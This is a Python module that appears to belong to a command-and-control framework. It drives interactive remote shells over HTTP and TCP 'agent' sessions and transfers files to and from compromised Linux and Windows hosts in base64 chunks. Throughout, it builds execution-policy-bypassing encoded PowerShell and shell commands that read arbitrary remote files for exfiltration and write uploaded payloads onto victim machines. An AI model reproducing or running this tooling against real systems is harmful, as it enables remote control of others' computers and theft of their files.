import base64, socket
from core import session_manager
import queue
import subprocess, os, sys
from tqdm import tqdm

from colorama import init, Fore, Style
brightgreen = Style.BRIGHT + Fore.GREEN
brightyellow = Style.BRIGHT + Fore.YELLOW
brightred = Style.BRIGHT + Fore.RED
brightblue = Style.BRIGHT + Fore.BLUE

def print_raw_progress(current, total, bar_width=40):
    percent = current / total
    done = int(bar_width * percent)
    bar = "[" + "#" * done + "-" * (bar_width - done) + f"] {int(percent * 100)}%"
    sys.stdout.write("\r" + bar)
    sys.stdout.flush()

def run_command_http(sid, cmd):
    session = session_manager.sessions[sid]
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    meta = session.metadata

    b64_cmd = base64.b64encode(cmd.encode()).decode()

    try:
        session.command_queue.put(b64_cmd)

    except Exception as e:
        print(brightred + f"[-] ERROR failed to send command through the queue: {e}")

    try:
        out_b64 = session.output_queue.get()

    except Exception as e:
        print(brightred + f"[-] ERROR failed to get command output from queue: {e}")

    try:
        return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()

    except Exception as e:
        print(brightred + f"[-] ERROR failed to decode command output: {e}")

def run_command_tcp(sid, cmd):
    session = session_manager.sessions[sid]
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    client_socket = session.handler

    try:
        try:
            client_socket.sendall(cmd.encode() + b"\n")

        except Exception as e:
            print(brightred + f"[-] ERROR failed to send command over socket: {e}")
            
        client_socket.settimeout(10.0)
        response = b''

        while True:
            try:
                chunk = client_socket.recv(4096)

                if not chunk:
                    break

                response += chunk

            except socket.timeout:
                break

        return response.decode(errors='ignore').strip()

    except Exception as e:
        return f"[!] Error: {e}"


def interactive_http_shell(sid):
    session = session_manager.sessions[sid]
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    meta = session.metadata

    print(brightgreen + f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")

    while True:
        cmd = input(f"{display}> ").strip()
        if cmd.lower() in ("exit", "quit"):
            break

        if not cmd:
            continue

        if not cmd.lower():
            continue

        b64_cmd = base64.b64encode(cmd.encode()).decode()
        session.command_queue.put(b64_cmd)

        # Wait for output from this session only
        out_b64 = session.output_queue.get()

        try:
            out = base64.b64decode(out_b64).decode("utf-8", "ignore")
        except:
            out = "<decoding error>"

        print(out.rstrip())

def interactive_tcp_shell(sid):
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    client_socket = session_manager.sessions[sid].handler
    print(brightgreen + f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")

    try:
        while True:
            cmd = input(f"{display}> ")
            if cmd.strip().lower() in ("exit", "quit"):
                client_socket.close()
                del session_manager.sessions[sid]
                print(brightyellow + f"[*] Closed TCP session {display}")
                break

            if not cmd.strip():
                continue

            try:
                client_socket.sendall(cmd.encode() + b"\n")

            except BrokenPipeError:
                print(brightred + "[!] Connection closed by remote host.")
                break

            client_socket.settimeout(10.0)
            response = b''

            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            print(response.decode(errors='ignore').strip())

    except Exception as e:
        print(brightred + f"[!] Error: {e}")
        client_socket.close()
        del session_manager.sessions[sid]

### 🧨 File download logic:

# Create encoded powershell command string
def build_powershell_encoded_download(remote_file):
    #safe_path = remote_file.replace("\\", "\\\\")
    #print(remote_file)
    #print(safe_path)



    raw_command = (
        f"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
        f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
        "[Convert]::ToBase64String($bytes)"
    )
    #print(raw_command)
    encoded_bytes = raw_command.encode("utf-16le")
    encoded_b64 = base64.b64encode(encoded_bytes).decode()
    full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_b64}"
    return full_cmd

    # Encode to UTF-16LE as required by EncodedCommand
    #utf16_command = raw_command.encode("utf-16le")
    #encoded_command = base64.b64encode(utf16_command).decode()

    #return f"powershell -EncodedCommand {encoded_command}"



def download_file_http(sid, remote_file, local_file):
    session = session_manager.sessions[sid]
    meta = session.metadata

    if meta.get("os", "").lower() == "linux":
        host = meta.get("hostname", "").lower()
        CHUNK_SIZE = 30000  # Number of bytes per chunk (before base64 encoding)
        MAX_CHUNKS = 10000  # Safeguard to prevent infinite loop

        # Get file size first
        size_cmd = f"stat -c %s {remote_file}"
        session.command_queue.put(base64.b64encode(size_cmd.encode()).decode())
        file_size_raw = session.output_queue.get()

        print(brightyellow + f"[*] Downloading file from {host} in chunks...")

        try:
            file_size = int(base64.b64decode(file_size_raw).decode().strip())
        except:
            print(brightred + f"[-] Failed to get file size for {remote_file}")
            return

        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
        collected_b64 = ""
        collection = bytearray()

        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
            for i in range(total_chunks):
                offset = i * CHUNK_SIZE
                chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
                b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()

                session.command_queue.put(b64_chunk_cmd)
                chunk_output = session.output_queue.get()

                try:
                    chunk_decoded = base64.b64decode(chunk_output)
                    data_decode = base64.b64decode(chunk_decoded)
                    collection.extend(data_decode)
                    #collected_b64 += chunk_decoded
                    pbar.update(1)
                except Exception as e:
                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
                    break

        try:
            #decoded_file = base64.b64decode(collected_b64.encode())

            with open(local_file, "wb") as f:
                f.write(collection)

            with open(local_file, "rb") as f:
                bom = f.read(2)

            # UTF-16LE BOM is 0xFF 0xFE
            if bom == b"\xff\xfe":
                # it’s UTF-16LE — convert it in-place
                tmp = local_file + ".utf8"
                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
                os.replace(local_file + '.tmp', local_file)
                
                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

            else:
                pass

            print(brightgreen + f"[+] Download complete. Saved to {local_file}")

        except Exception as e:
            print(brightred + f"[!] Error decoding final file: {e}")

    elif meta.get("os", "") .lower() == "windows":
        CHUNK_SIZE = 1024 * 1024  # Adjust safely for command length + base64
        MAX_CHUNKS = 10000

        print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

        # Step 1: Get file size
        size_cmd = (
        f"$s=(Get-Item \"{remote_file}\").Length;"
        f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
        )

        b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
        session.command_queue.put(b64_size_cmd)
        size_b64 = session.output_queue.get()

        try:
            size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
            file_size = int(size_str.strip())
            #size_str = base64.b64decode(size_b64).decode().strip()
            #file_size = int(size_str)

        except Exception as e:
            print(brightred + f"[-] Failed to parse file size: {e}")
            return

        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
        #print(total_chunks)
        #collected_b64 = ""
        collected_b64 = bytearray()
        collection = bytearray()

        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
            for i in range(total_chunks):
                offset = i * CHUNK_SIZE

                # Step 2: Read chunk using PowerShell and base64 encode it
                chunk_cmd = (
                    f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
                    f"$fs.Seek({offset},'Begin') > $null;"
                    f"$buf = New-Object byte[] {CHUNK_SIZE};"
                    f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
                    f"$fs.Close();"
                    f"[Convert]::ToBase64String($buf, 0, $read)"
                )

                b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
                session.command_queue.put(b64_chunk_cmd)
                chunk_output = session.output_queue.get()

                try:
                    #chunk_decoded = base64.b64decode(chunk_output).decode()
                    chunk_decoded = base64.b64decode(chunk_output)
                    data_decode = base64.b64decode(chunk_decoded)
                    collection.extend(data_decode)
                    #collected_b64 += chunk_decoded
                    pbar.update(1)

                except Exception as e:
                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
                    break

        # Step 3: Final decode & write
        try:
            #print(type(collected_b64))
            #print(collected_b64)
            #collect_decoded = base64.b64decode(collected_b64)
            #decode_bytes = collect_decoded.decode(errors='ignore').strip()
            
            with open(local_file, "wb") as f:
                f.write(collection)


            with open(local_file, "rb") as f:
                bom = f.read(2)

            # UTF-16LE BOM is 0xFF 0xFE
            if bom == b"\xff\xfe":
                # it’s UTF-16LE — convert it in-place
                tmp = local_file + ".utf8"
                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
                os.replace(local_file + '.tmp', local_file)
                
                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

            else:
                pass
            #subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
            #os.replace(local_file + '.tmp', local_file)

            print(brightgreen + f"[+] Download complete. Saved to {local_file}")

        except Exception as e:
            print(brightred + f"[!] Error decoding final file: {e}")


def download_file_tcp(sid, remote_file, local_file):
    client_socket = session_manager.sessions[sid].handler
    session = session_manager.sessions[sid]
    meta = session.metadata

    if meta.get("os", "").lower() == "linux":
        CHUNK_SIZE = 30000
        MAX_CHUNKS = 10000
        host = meta.get("hostname", "").lower()

        print(brightyellow + f"[*] Downloading file from {host} in chunks over TCP...")

        # Step 1: Get file size
        size_cmd = f"stat -c %s {remote_file}"
        client_socket.sendall((size_cmd + "\n").encode())

        file_size_raw = b""
        client_socket.settimeout(2)
        while True:
            try:
                chunk = client_socket.recv(4096)

                if not chunk:
                    break

                file_size_raw += chunk

            except socket.timeout:
                break

        try:
            file_size = file_size_raw.decode()
            stripped_file_size = file_size.strip()
            clean_file_size = stripped_file_size.splitlines()[0].strip()
            number_file_size = int(clean_file_size)
            #print(decoded_file_size)
            #file_size = int(file_size_raw.decode().strip())

        except Exception as e:
            print(brightred + f"[-] Failed to get file size: {e}")
            return

        try:
            total_chunks = (number_file_size + CHUNK_SIZE - 1) // CHUNK_SIZE

        except Exception as e:
            print(brightred + f"[-] ERROR failed to calculate total chunks: {e}")

        collected_b64 = ""

        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
            for i in range(total_chunks):
                offset = i * CHUNK_SIZE
                chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
                client_socket.sendall((chunk_cmd + "\n").encode())

                chunk_data = b""
                while True:
                    try:
                        part = client_socket.recv(4096)

                        if not part:
                            break

                        chunk_data += part

                    except socket.timeout:
                        break

                try:
                    decoded = chunk_data.decode(errors='ignore').strip()
                    #decoded = base64.b64decode(chunk_data.decode().strip())
                    collected_b64 += decoded
                    pbar.update(1)

                except Exception as e:
                    print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
                    break

        try:
            final_bytes = base64.b64decode(collected_b64.encode())

            with open(local_file, "wb") as f:
                f.write(final_bytes)

            with open(local_file, "rb") as f:
                bom = f.read(2)

            # UTF-16LE BOM is 0xFF 0xFE
            if bom == b"\xff\xfe":
                # it’s UTF-16LE — convert it in-place
                tmp = local_file + ".utf8"
                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
                os.replace(local_file + '.tmp', local_file)
                
                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

            else:
                pass

            print(brightgreen + f"[+] Download complete. Saved to {local_file}")

        except Exception as e:
            print(brightred + f"[!] Error saving file: {e}")


    elif meta.get("os", "").lower() == "windows":
        CHUNK_SIZE = 30000

        try:
            # Get file size
            size_cmd = (
                f"$s=(Get-Item \"{remote_file}\").Length;"
                f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
            )
            client_socket.sendall((size_cmd + "\n").encode())
            raw_size = client_socket.recv(4096).decode()
            size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
            file_size = int(size_str.strip())
            

        except Exception as e:
            print(brightred + f"[-] Failed to get file size: {e}")
            return

        total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
        collected_b64 = ""

        print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

        with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
            for i in range(total_chunks):
                offset = i * CHUNK_SIZE
                chunk_cmd = (
                    f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
                    f"$fs.Seek({offset},'Begin') > $null;"
                    f"$buf = New-Object byte[] {CHUNK_SIZE};"
                    f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
                    f"$fs.Close();"
                    f"[Convert]::ToBase64String($buf, 0, $read)"
                )

                client_socket.sendall((chunk_cmd + "\n").encode())

                client_socket.settimeout(3)
                chunk_data = b""
                try:
                    expected_encoded_len = int(((CHUNK_SIZE + 2) // 3) * 4)  # Base64 size
                    while len(chunk_data) < expected_encoded_len:
                        try:
                            part = client_socket.recv(4096)
                            if not part:
                                break

                            chunk_data += part

                            if b"\n" in part:
                                break

                        except Exception as e:
                            print(brightred + f"[-] ERROR an error ocurred: {e}")

                except socket.timeout:
                    pass

                try:
                    #base64_decoded_chunk = base64.b64decode(chunk_data)
                    chunk_decoded = chunk_data.decode(errors='ignore').strip()
                    #chunk_decoded = base64.b64decode(chunk_data).decode()
                    collected_b64 += chunk_decoded
                    print(collected_b64)
                    pbar.update(1)

                except Exception as e:
                    print(brightred + f"[-] Failed decoding chunk {i+1}: {e}")
                    break

        try:
            final_data = base64.b64decode(collected_b64.encode())

            with open(local_file, "wb") as f:
                f.write(final_data)

            with open(local_file, "rb") as f:
                bom = f.read(2)

            # UTF-16LE BOM is 0xFF 0xFE
            if bom == b"\xff\xfe":
                # it’s UTF-16LE — convert it in-place
                tmp = local_file + ".utf8"
                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
                os.replace(local_file + '.tmp', local_file)
                
                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

            else:
                pass

            #subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
            #os.replace(local_file + '.tmp', local_file)

            print(brightgreen + f"\n[+] Download complete. Saved to {local_file}\n")

        except Exception as e:
            print(brightred + f"[!] Error writing final file: {e}")
            

### 🔥 Upload Logic (NEW!) ###

CHUNK_SIZE = 7000  #You can change this!!

# Build the powershell to append a chunk
def build_chunk_upload_command(remote_file, b64chunk):
    safe_chunk = b64chunk.replace("'", "''")  # PowerShell escape for single quotes
    #safe_path = remote_file.replace("\\", "\\\\")

    raw_commanddata = (
        "[Console]::OutputEncoding = [System.Text.Encoding]::ASCII;"
        "[Console]::InputEncoding  = [System.Text.Encoding]::ASCII;"
        f"$bytes = [Convert]::FromBase64String(\"{safe_chunk}\");"
        f"$stream = [System.IO.File]::Open(\"{remote_file}\", 'Append', 'Write', 'None');"
        "$stream.Write($bytes, 0, $bytes.Length);"
        "$stream.Close()"
    )

    encoded_command = base64.b64encode(raw_commanddata.encode("utf-16le")).decode()
    full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_command}"
    return full_cmd


# Upload for HTTP agents
def upload_file_http(sid, local_file, remote_file):
    session = session_manager.sessions[sid]
    meta = session.metadata
    host = meta.get("hostname", "").lower()
    os_type = meta.get("os", "").lower()

    if os_type == "linux":
        CHUNK_SIZE = 45000

        # Clear the remote file first
        clear_cmd = f"rm -f {remote_file}"
        b64_clear = base64.b64encode(clear_cmd.encode()).decode()
        session.command_queue.put(b64_clear)
        session.output_queue.get()

        try:
            with open(local_file, "r") as f:
                file_data = f.read()

        except Exception as e:
            print(brightred + f"[-] ERROR opening local file: {e}")

        #print("DEBUG")

        try:
            if file_data and file_data is not None:
                b64_filedata = base64.b64encode(file_data.encode()).decode()

            else:
                print(brightred + f"[-] ERROR failed to encode local file.")

        except Exception as e:
            print(brightred + f"[-] ERROR failed to encode local file because of error: {e}")

        #print("DEBUG1")

        total_chunks = (len(b64_filedata) + CHUNK_SIZE - 1) // CHUNK_SIZE

        #print("SET TOTAL CHUNKS")


        try:
            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
                for i in range(0, len(b64_filedata), CHUNK_SIZE):
                    #print("ENTERED FOR LOOP")
                    chunk = b64_filedata[i:i + CHUNK_SIZE]
                    cmd = f"printf '%s' '{chunk}' | base64 -d >> {remote_file}"
                    b64_cmd = base64.b64encode(cmd.encode()).decode()
                    session.command_queue.put(b64_cmd)
                    session.output_queue.get()
                    pbar.update(1)

        except Exception as e:
            print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
            print(brightred + f"[-] ERROR DEBUG INFO: {e}")

        print(brightyellow + f"[*] Uploading file to HTTP agent {host}...")
            
        
    elif os_type == "windows":
        CHUNK_SIZE = 5000
        # Read file and prepare chunks

        try:
            with open(local_file, "rb") as f:
                file_data = f.read()

        except Exception as e:
            print(brightred + f"[-] ERROR ocurred: {e}")


        b64_data = base64.b64encode(file_data).decode()

        total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE

        # Clear existing remote file
        clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}"
        b64_clear = base64.b64encode(clear_cmd.encode()).decode()
        session.command_queue.put(b64_clear)


        print(brightyellow + f"[*] Uploading file to HTTP agent {sid}...")

        # Send chunks
        try:
            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
                for i in range(0, len(b64_data), CHUNK_SIZE):
                    chunk = b64_data[i:i + CHUNK_SIZE]
                    chunk_cmd = build_chunk_upload_command(remote_file, chunk)
                    b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
                    session.command_queue.put(b64_chunk_cmd)
                    session.output_queue.get()
                    pbar.update(1)

        except Exception as e:
            print(brightred + f"[-] ERROR failed to upload file chunks to {host}")
            print(brightred + f"[-] ERROR DEBUG INFO: {e}")

        print(brightgreen + f"[+] Upload complete for {remote_file}")

# Upload for TCP agents
def upload_file_tcp(sid, local_file, remote_file):
    client_socket = session_manager.sessions[sid].handler
    session = session_manager.sessions[sid]
    meta = session.metadata
    host = meta.get("hostname", "").lower()
    os_type = meta.get("os", "").lower()
    CHUNK_SIZE = 45000

    print(brightyellow + f"[*] Uploading file to TCP agent {host}...")

    try:
        with open(local_file, "rb") as f:
            file_data = f.read()
    except Exception as e:
        print(brightred + f"[-] ERROR opening local file: {e}")
        return

    try:
        if file_data:
            b64_data = base64.b64encode(file_data).decode()
        else:
            print(brightred + f"[-] ERROR: local file was empty or unreadable.")
            return
    except Exception as e:
        print(brightred + f"[-] ERROR encoding local file: {e}")
        return

    if os_type == "windows":
        clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}\n"

    elif os_type == "linux":
        clear_cmd = f"rm -f \"{remote_file}\"\n"

    else:
        print(brightred + f"[-] Unsupported OS type: {os_type}")
        return

    try:
        client_socket.sendall(clear_cmd.encode())

    except Exception as e:
        print(brightred + f"[-] ERROR sending command: {e}")
        return

    total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE

    if os_type == "linux":
        try:
            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
                for i in range(total_chunks):
                    chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
                    chunk_cmd = f"printf '%s' '{chunk}' | base64 -d >> \"{remote_file}\"\n"

                    try:
                        client_socket.sendall(chunk_cmd.encode())
                        try:
                            pbar.update(1)

                        except Exception as e:
                            print(brightred + f"[-] ERROR printing progress bar: {e}")

                    except Exception as e:
                        print(brightred + f"[-] ERROR ocurred when sending command: {e}")

        except Exception as e:
            print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
            return

        print(brightgreen + f"[+] Upload complete for {remote_file}")

    elif os_type == "windows":
        CHUNK_SIZE = 5000
        total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
        try:
            with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
                for i in range(total_chunks):
                    chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
                    chunk_cmd = build_chunk_upload_command(remote_file, chunk) + "\n"

                    try:
                        client_socket.sendall(chunk_cmd.encode())
                        try:
                            pbar.update(1)

                        except Exception as e:
                            print(brightred + f"[-] ERROR printing progress bar: {e}")

                    except Exception as e:
                        print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
                        return

        except Exception as e:
            print(brightred + f"[-] ERROR sending chunk {i//CHUNK_SIZE + 1}: {e}")
            return

        print(brightgreen + f"[+] Upload complete for {remote_file}")

    else:
        print(brightred + f"[-] Unsupported OS detected!")


output_queue = queue.Queue()

def printer_thread():
    while True:
        sid, out_b64 = output_queue.get()
        try:
            out = base64.b64decode(out_b64).decode("utf-8", "ignore")
            #print("TEST")
        except:
            out = "<decoding error>"
        print(f"\n[{sid}] {out.strip()}")

